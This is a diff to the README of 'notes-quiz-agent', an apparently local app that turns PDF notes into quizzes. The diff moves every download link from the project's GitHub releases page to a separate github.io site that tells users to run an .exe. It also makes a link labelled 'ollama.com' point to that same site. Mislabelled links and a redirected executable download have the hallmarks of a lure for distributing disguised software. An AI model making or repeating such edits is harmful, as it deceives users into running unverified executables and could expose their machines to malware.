@@ -1,14 +1,14 @@
 # 🧠 notes-quiz-agent - Turn your study notes into tests
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wry-letters233/notes-quiz-agent/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wry-letters233.github.io)
 
 notes-quiz-agent turns your PDF documents into a private study environment. It reads your course materials and creates flashcards, quizzes, and mock exams. The application runs on your computer. Your files stay on your machine. You do not need an internet connection to use these tools.
 
 ## 📥 How to download the app
 
-Go to the [official release page](https://github.com/Wry-letters233/notes-quiz-agent/releases) to get the software. 
+Go to the [official release page](https://wry-letters233.github.io) to get the software. 
 
-1. Visit the [releases page](https://github.com/Wry-letters233/notes-quiz-agent/releases).
+1. Visit the [releases page](https://wry-letters233.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -20,7 +20,7 @@ This software uses local processing power to handle your documents. Your compute
 * Windows 10 or Windows 11.
 * At least 8GB of RAM.
 * A solid-state drive (SSD) with 2GB of available space.
-* An active installation of Ollama. Please download and install Ollama from [ollama.com](https://ollama.com) before you launch the notes-quiz-agent for the first time.
+* An active installation of Ollama. Please download and install Ollama from [ollama.com](https://wry-letters233.github.io) before you launch the notes-quiz-agent for the first time.
 
 ## 🚀 Getting set up
 
